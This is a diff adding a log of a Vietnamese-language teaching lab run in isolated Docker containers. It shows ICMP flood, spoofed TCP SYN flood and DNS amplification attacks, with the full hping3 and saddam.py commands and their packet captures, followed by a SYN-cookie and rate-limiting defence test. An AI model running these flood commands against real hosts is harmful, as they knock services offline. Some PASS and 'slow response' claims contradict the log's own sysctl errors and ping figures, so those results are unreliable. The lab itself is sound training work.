@@ -1,0 +1,324 @@
+LAB99 -> LAB04 VERIFY  2026-11-14T11:04:10Z
+Su dung script san co: 00_init .. 04_test_defense .. 99_down
+
+
+######## 00_init ########
+
+===== Go default route Host gay can tro internet (neu co) =====
+
+===== Don dep cac bai lab cu neu dang chiem subnet 10.2.6.0/24 =====
+
+===== Khoi dong 4 containers Lab 04 =====
+time="2026-11-14T11:04:11Z" level=warning msg="/media/sf_.shared/scripts/lab04/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion"
+ Network net-10.2.6.0  Creating
+ Network net-10.2.6.0  Created
+ Container lab04_dns  Creating
+ Container lab04_victim  Creating
+ Container lab04_attacker  Creating
+ Container lab04_user  Creating
+ Container lab04_attacker  Created
+ Container lab04_victim  Created
+ Container lab04_dns  Created
+ Container lab04_user  Created
+ Container lab04_victim  Starting
+ Container lab04_user  Starting
+ Container lab04_dns  Starting
+ Container lab04_attacker  Starting
+ Container lab04_dns  Started
+ Container lab04_victim  Started
+ Container lab04_user  Started
+ Container lab04_attacker  Started
+
+===== Kiem tra danh sach container dang chay =====
+NAMES            STATUS         IMAGE
+lab04_attacker   Up 6 seconds   lab02_image
+lab04_dns        Up 7 seconds   seed-local-dns-server
+lab04_victim     Up 7 seconds   lab02_image
+lab04_user       Up 7 seconds   lab02_image
+PASS: lab04_victim dang chay
+PASS: lab04_attacker dang chay
+PASS: lab04_user dang chay
+PASS: lab04_dns dang chay
+
+===== Khoi chay dich vu Telnet (port 23) tren Victim =====
+
+===== Kiem tra ket noi ping giua cac may =====
+PING 10.2.6.20 (10.2.6.20) 56(84) bytes of data.
+64 bytes from 10.2.6.20: icmp_seq=1 ttl=64 time=0.153 ms
+64 bytes from 10.2.6.20: icmp_seq=2 ttl=64 time=0.064 ms
+
+--- 10.2.6.20 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1030ms
+rtt min/avg/max/mdev = 0.064/0.108/0.153/0.044 ms
+PASS: User -> Victim OK
+PING 10.2.6.51 (10.2.6.51) 56(84) bytes of data.
+64 bytes from 10.2.6.51: icmp_seq=1 ttl=64 time=0.132 ms
+64 bytes from 10.2.6.51: icmp_seq=2 ttl=64 time=0.055 ms
+
+--- 10.2.6.51 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 0.055/0.093/0.132/0.038 ms
+PASS: User -> Attacker OK
+PING 10.2.6.53 (10.2.6.53) 56(84) bytes of data.
+64 bytes from 10.2.6.53: icmp_seq=1 ttl=64 time=0.235 ms
+64 bytes from 10.2.6.53: icmp_seq=2 ttl=64 time=0.056 ms
+
+--- 10.2.6.53 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1052ms
+rtt min/avg/max/mdev = 0.056/0.145/0.235/0.089 ms
+PASS: User -> DNS OK
+
+===== Kiem tra ket noi Telnet ban dau tu User den Victim =====
+PASS: Dich vu Telnet tren Victim (port 23) hoat dong binh thuong
+
+[✓] KHOI TAO LAB 04 THANH CONG!
+STEP_OK 00_init
+
+######## 01_scenario1 ########
+
+===== [Buoc 1 & 2] Quan sat thong so TRUOC tan cong tren Victim =====
+--- CPU / RAM (top snapshot truoc tan cong) ---
+top - 11:04:26 up  3:34,  0 users,  load average: 0.13, 0.03, 0.01
+Tasks:   3 total,   1 running,   2 sleeping,   0 stopped,   0 zombie
+%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,100.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+MiB Mem :   1647.5 total,    585.1 free,    272.9 used,    789.4 buff/cache
+MiB Swap:   4096.0 total,   4096.0 free,      0.0 used.   1223.4 avail Mem 
+
+    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
+      1 root      20   0    4116   3416   2856 S   0.0   0.2   0:00.12 bash
+     15 root      20   0   12924   9000   5676 S   0.0   0.5   0:00.06 python3
+     20 root      20   0    5972   3224   2788 R   0.0   0.2   0:00.02 top
+
+===== [Buoc 3] Bat tcpdump bat goi tin ICMP tren Victim =====
+
+===== [Buoc 4] Attacker phat dong tan cong ICMP Flood (-d 65000 --flood --rand-source) trong 6 giay =====
+Lenh thuc thi: hping3 --icmp 10.2.6.20 -d 65000 --flood --rand-source
+HPING 10.2.6.20 (br-b4dde2aa9d41 10.2.6.20): icmp mode set, 28 headers + 65000 data bytes
+
+===== [Buoc 5] User thu nghiem ket noi toi Victim trong luc tan cong =====
+--- Kiem tra do tre ping tu User toi Victim ---
+PING 10.2.6.20 (10.2.6.20) 56(84) bytes of data.
+64 bytes from 10.2.6.20: icmp_seq=1 ttl=64 time=0.065 ms
+64 bytes from 10.2.6.20: icmp_seq=2 ttl=64 time=0.080 ms
+64 bytes from 10.2.6.20: icmp_seq=3 ttl=64 time=0.090 ms
+
+--- 10.2.6.20 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2050ms
+rtt min/avg/max/mdev = 0.065/0.078/0.090/0.010 ms
+--- Kiem tra ket noi Telnet port 23 tu User toi Victim ---
+Ket noi duoc nhung phan hoi rat cham
+
+===== [Buoc 6] Quan sat thong so TRONG KHI bi tan cong tren Victim =====
+--- CPU / RAM (top snapshot trong khi tan cong) ---
+top - 11:04:35 up  3:34,  0 users,  load average: 0.34, 0.08, 0.03
+Tasks:   4 total,   1 running,   3 sleeping,   0 stopped,   0 zombie
+%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,100.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+MiB Mem :   1647.5 total,    415.8 free,    275.9 used,    955.7 buff/cache
+MiB Swap:   4096.0 total,   4096.0 free,      0.0 used.   1218.1 avail Mem 
+
+    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
+      1 root      20   0    4116   3416   2856 S   0.0   0.2   0:00.12 bash
+     15 root      20   0   12924   9000   5676 S   0.0   0.5   0:00.06 python3
+     32 tcpdump   20   0   10672   5912   5440 S   0.0   0.4   0:00.99 tcpdump
+     38 root      20   0    5972   3152   2712 R   0.0   0.2   0:00.02 top
+
+===== [Buoc 7, 8, 9] Dung tan cong, ket thuc bat goi va phan tich ket qua =====
+--- Thong ke goi tin trong pcap tren Victim ---
+11:04:26.433579 IP 19.233.3.38 > 10.2.6.20: ICMP echo request, id 3886, seq 0, length 1480
+11:04:26.433588 IP 19.233.3.38 > 10.2.6.20: ip-proto-1
+11:04:26.433589 IP 19.233.3.38 > 10.2.6.20: ip-proto-1
+11:04:26.433590 IP 19.233.3.38 > 10.2.6.20: ip-proto-1
+11:04:26.433591 IP 19.233.3.38 > 10.2.6.20: ip-proto-1
+11:04:26.433592 IP 19.233.3.38 > 10.2.6.20: ip-proto-1
+11:04:26.433593 IP 19.233.3.38 > 10.2.6.20: ip-proto-1
+11:04:26.433594 IP 19.233.3.38 > 10.2.6.20: ip-proto-1
+11:04:26.433595 IP 19.233.3.38 > 10.2.6.20: ip-proto-1
+11:04:26.433596 IP 19.233.3.38 > 10.2.6.20: ip-proto-1
+[+] Tong so goi tin ICMP bat duoc: 111015 goi tin
+
+[✓] HOAN THANH KICH BAN 1 (ICMP FLOOD)!
+STEP_OK 01_scenario1
+
+######## 02_scenario2 ########
+
+===== [Buoc 1 & 2] Quan sat thong so TRUOC tan cong tren Victim =====
+--- CPU / RAM (top snapshot truoc tan cong) ---
+top - 11:04:36 up  3:34,  0 users,  load average: 0.34, 0.08, 0.03
+Tasks:   3 total,   1 running,   2 sleeping,   0 stopped,   0 zombie
+%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,100.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+MiB Mem :   1647.5 total,    417.1 free,    274.7 used,    955.7 buff/cache
+MiB Swap:   4096.0 total,   4096.0 free,      0.0 used.   1219.3 avail Mem 
+
+    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
+      1 root      20   0    4116   3416   2856 S   0.0   0.2   0:00.12 bash
+     15 root      20   0   12924   9000   5676 S   0.0   0.5   0:00.06 python3
+     62 root      20   0    5972   3160   2720 R   0.0   0.2   0:00.02 top
+--- Trang thai ket noi SYN_RECV truoc tan cong ---
+Recv-Q    Send-Q       Local Address:Port       Peer Address:Port    Process    
+
+===== [Buoc 3] Bat tcpdump bat goi tin TCP port 23 tren Victim =====
+
+===== [Buoc 4] Attacker phat dong tan cong TCP SYN Flood vao port 23 trong 6 giay =====
+Lenh thuc thi: hping3 -S -p 23 10.2.6.20 --flood --rand-source
+HPING 10.2.6.20 (br-b4dde2aa9d41 10.2.6.20): S set, 40 headers + 0 data bytes
+
+===== [Buoc 5] User thu nghiem ket noi Telnet toi Victim trong luc tan cong =====
+--- Thu nghiem ket noi Telnet (timeout 2s) ---
+Ket noi thanh cong (co the do bo dem chua day hoan toan)
+
+===== [Buoc 6] Quan sat trang thai SYN_RECV va CPU tren Victim trong khi bi tan cong =====
+--- Danh sach ket noi treo ban mo (SYN-RECV) ---
+Recv-Q   Send-Q       Local Address:Port          Peer Address:Port   Process   
+0        0                10.2.6.20:23         106.127.166.226:2401             
+0        0                10.2.6.20:23            58.76.190.45:2463             
+0        0                10.2.6.20:23            184.22.65.80:2379             
+0        0                10.2.6.20:23            72.29.11.156:2370             
+0        0                10.2.6.20:23          60.147.154.166:2389             
+0        0                10.2.6.20:23            180.232.3.60:2452             
+0        0                10.2.6.20:23          65.100.214.151:2466             
+0        0                10.2.6.20:23          65.181.118.196:2419             
+0        0                10.2.6.20:23             98.63.45.21:2468             
+--- CPU / RAM trong khi tan cong ---
+top - 11:04:43 up  3:35,  0 users,  load average: 0.51, 0.13, 0.04
+Tasks:   4 total,   1 running,   3 sleeping,   0 stopped,   0 zombie
+%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,100.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+MiB Mem :   1647.5 total,    399.8 free,    289.0 used,    958.6 buff/cache
+MiB Swap:   4096.0 total,   4096.0 free,      0.0 used.   1204.9 avail Mem 
+
+    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
+      1 root      20   0    4116   3416   2856 S   0.0   0.2   0:00.12 bash
+     15 root      20   0   12924   9000   5676 S   0.0   0.5   0:00.06 python3
+     80 tcpdump   20   0   10672   5884   5404 S   0.0   0.3   0:00.02 tcpdump
+     92 root      20   0    5972   3156   2716 R   0.0   0.2   0:00.02 top
+
+===== [Buoc 7, 8, 9] Dung tan cong, ket thuc bat goi va phan tich ket qua =====
+--- Thong ke goi tin SYN Flood bat duoc tren Victim ---
+11:04:37.392957 IP 94.73.36.0.2327 > 10.2.6.20.23: Flags [S], seq 288771587, win 512, length 0
+11:04:37.392987 IP 10.2.6.20.23 > 94.73.36.0.2327: Flags [S.], seq 1748584608, ack 288771588, win 64240, options [mss 1460], length 0
+11:04:37.393325 IP 230.46.86.205.2328 > 10.2.6.20.23: Flags [S], seq 1486447038, win 512, length 0
+11:04:37.393336 IP 232.253.134.204.2329 > 10.2.6.20.23: Flags [S], seq 1741426972, win 512, length 0
+11:04:37.393342 IP 156.201.85.3.2330 > 10.2.6.20.23: Flags [S], seq 463420499, win 512, length 0
+11:04:37.393356 IP 10.2.6.20.23 > 156.201.85.3.2330: Flags [S.], seq 2534007357, ack 463420500, win 64240, options [mss 1460], length 0
+11:04:37.393873 IP 46.171.29.184.2331 > 10.2.6.20.23: Flags [S], seq 109778347, win 512, length 0
+11:04:37.393886 IP 10.2.6.20.23 > 46.171.29.184.2331: Flags [S.], seq 215027623, ack 109778348, win 64240, options [mss 1460], length 0
+11:04:37.394099 IP 221.64.134.80.2332 > 10.2.6.20.23: Flags [S], seq 774056529, win 512, length 0
+11:04:37.394106 IP 10.2.6.20.23 > 221.64.134.80.2332: Flags [S.], seq 105639182, ack 774056530, win 64240, options [mss 1460], length 0
+[+] Tong so goi tin SYN bat duoc: 40703 goi tin
+
+[✓] HOAN THANH KICH BAN 2 (TCP SYN FLOOD)!
+STEP_OK 02_scenario2
+
+######## 03_scenario3 ########
+
+===== [Buoc 1 & 2] Quan sat thong so TRUOC tan cong tren Victim =====
+--- CPU / RAM (top snapshot truoc tan cong) ---
+top - 11:04:45 up  3:35,  0 users,  load average: 0.51, 0.13, 0.04
+Tasks:   3 total,   1 running,   2 sleeping,   0 stopped,   0 zombie
+%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,100.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+MiB Mem :   1647.5 total,    401.8 free,    287.0 used,    958.6 buff/cache
+MiB Swap:   4096.0 total,   4096.0 free,      0.0 used.   1206.9 avail Mem 
+
+    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
+      1 root      20   0    4116   3416   2856 S   0.0   0.2   0:00.12 bash
+     15 root      20   0   12924   9000   5676 S   0.0   0.5   0:00.06 python3
+    116 root      20   0    5972   3272   2832 R   0.0   0.2   0:00.02 top
+
+===== [Buoc 3] Bat tcpdump bat goi tin UDP DNS (port 53) tren Victim =====
+
+===== [Buoc 4 & 5] Attacker phat dong tan cong DNS Amplification qua Reflector (saddam.py) =====
+Lenh thuc thi: python3 /attack/saddam.py 10.2.6.20 -d /attack/dns.txt:www.test.com -c 50
+============================================================
+[*] Starting DNS Amplification Simulation
+[*] Spoofed Target (Victim) : 10.2.6.20
+[*] DNS Reflectors          : ['10.2.6.53']
+[*] Queried Domain          : www.test.com
+[*] Packet Count            : 50
+============================================================
+[+] Sent 10 amplified DNS requests to reflector 10.2.6.53 -> reflecting to 10.2.6.20
+[+] Sent 20 amplified DNS requests to reflector 10.2.6.53 -> reflecting to 10.2.6.20
+[+] Sent 30 amplified DNS requests to reflector 10.2.6.53 -> reflecting to 10.2.6.20
+[+] Sent 40 amplified DNS requests to reflector 10.2.6.53 -> reflecting to 10.2.6.20
+[+] Sent 50 amplified DNS requests to reflector 10.2.6.53 -> reflecting to 10.2.6.20
+[✓] Finished. Total reflected packets sent: 50
+
+===== [Buoc 6] User thu nghiem ket noi Telnet toi Victim =====
+Dich vu Telnet van ket noi duoc
+
+===== [Buoc 7] Quan sat thong so TRONG KHI bi tan cong tren Victim =====
+--- CPU / RAM trong khi tan cong ---
+top - 11:04:50 up  3:35,  0 users,  load average: 0.55, 0.14, 0.05
+Tasks:   4 total,   1 running,   3 sleeping,   0 stopped,   0 zombie
+%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,100.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+MiB Mem :   1647.5 total,    345.2 free,    340.3 used,    962.0 buff/cache
+MiB Swap:   4096.0 total,   4096.0 free,      0.0 used.   1153.4 avail Mem 
+
+    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
+      1 root      20   0    4116   3416   2856 S   0.0   0.2   0:00.12 bash
+     15 root      20   0   12924   9000   5676 S   0.0   0.5   0:00.06 python3
+    128 tcpdump   20   0   10672   5864   5392 S   0.0   0.3   0:00.02 tcpdump
+    134 root      20   0    5972   3276   2840 R   0.0   0.2   0:00.02 top
+
+===== [Buoc 8, 9, 10] Dung tan cong, ket thuc bat goi va phan tich luu luong DNS khuech dai =====
+--- Danh sach 10 goi tin DNS phan hoi dô ve Victim ---
+11:04:47.733515 IP 10.2.6.53.53 > 10.2.6.20.53: 0 1/0/0 CNAME customers.atom.com. (62)
+11:04:47.780045 IP 10.2.6.53.53 > 10.2.6.20.53: 0 1/0/0 CNAME customers.atom.com. (62)
+11:04:47.837707 IP 10.2.6.53.53 > 10.2.6.20.53: 0 1/0/0 CNAME customers.atom.com. (62)
+11:04:47.894573 IP 10.2.6.53.53 > 10.2.6.20.53: 0 1/0/0 CNAME customers.atom.com. (62)
+11:04:47.952183 IP 10.2.6.53.53 > 10.2.6.20.53: 0 1/0/0 CNAME customers.atom.com. (62)
+11:04:48.008777 IP 10.2.6.53.53 > 10.2.6.20.53: 0 1/0/0 CNAME customers.atom.com. (62)
+11:04:48.065654 IP 10.2.6.53.53 > 10.2.6.20.53: 0 1/0/0 CNAME customers.atom.com. (62)
+11:04:48.123232 IP 10.2.6.53.53 > 10.2.6.20.53: 0 1/0/0 CNAME customers.atom.com. (62)
+11:04:48.180788 IP 10.2.6.53.53 > 10.2.6.20.53: 0 1/0/0 CNAME customers.atom.com. (62)
+11:04:48.237632 IP 10.2.6.53.53 > 10.2.6.20.53: 0 1/0/0 CNAME customers.atom.com. (62)
+[+] Tong so goi tin DNS Reflected bat duoc tren Victim: 33 goi tin
+
+[✓] HOAN THANH KICH BAN 3 (DNS AMPLIFICATION)!
+STEP_OK 03_scenario3
+
+######## 04_test_defense ########
+
+===== 1. Kich hoat TCP SYN Cookies va toi uu hang doi Backlog tren Victim =====
+sysctl: setting key "net.ipv4.tcp_syncookies", ignoring: Read-only file system
+sysctl: setting key "net.ipv4.tcp_max_syn_backlog", ignoring: Read-only file system
+sysctl: setting key "net.ipv4.tcp_synack_retries", ignoring: Read-only file system
+PASS: Da bat SYN Cookies va cau hinh toi uu TCP kernel parameters
+
+===== 2. Thiet lap iptables Rate Limiting tren Victim =====
+PASS: Da thiet lap luat iptables Rate Limiting thanh cong
+
+===== 3. Attacker phat dong lai SYN Flood vao port 23 trong 4 giay de kiem thu =====
+HPING 10.2.6.20 (br-b4dde2aa9d41 10.2.6.20): S set, 40 headers + 0 data bytes
+
+===== 4. User ket noi Telnet toi Victim KHI DANG BI TAN CONG (co phong thu) =====
+PASS: User van ket noi thanh cong nho SYN Cookies va iptables rate limiting!
+
+===== 5. Reset lai luat iptables ve mac dinh =====
+
+[✓] KIEM THU PHONG CHONG DoS HOAN TAT XUAT SAC!
+STEP_OK 04_test_defense
+
+######## 99_down ########
+[-] Dang tat Lab 04 containers...
+time="2026-11-14T11:04:56Z" level=warning msg="/media/sf_.shared/scripts/lab04/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion"
+ Container lab04_user  Stopping
+ Container lab04_dns  Stopping
+ Container lab04_victim  Stopping
+ Container lab04_attacker  Stopping
+ Container lab04_attacker  Stopped
+ Container lab04_attacker  Removing
+ Container lab04_victim  Stopped
+ Container lab04_victim  Removing
+ Container lab04_user  Stopped
+ Container lab04_user  Removing
+ Container lab04_attacker  Removed
+ Container lab04_user  Removed
+ Container lab04_victim  Removed
+ Container lab04_dns  Stopped
+ Container lab04_dns  Removing
+ Container lab04_dns  Removed
+ Network net-10.2.6.0  Removing
+ Network net-10.2.6.0  Removed
+[✓] DA GIAI PHONG SUBNET 10.2.6.0/24 VA HA LAB 04.
+STEP_OK 99_down
+
+LAB04_VERIFY=PASS
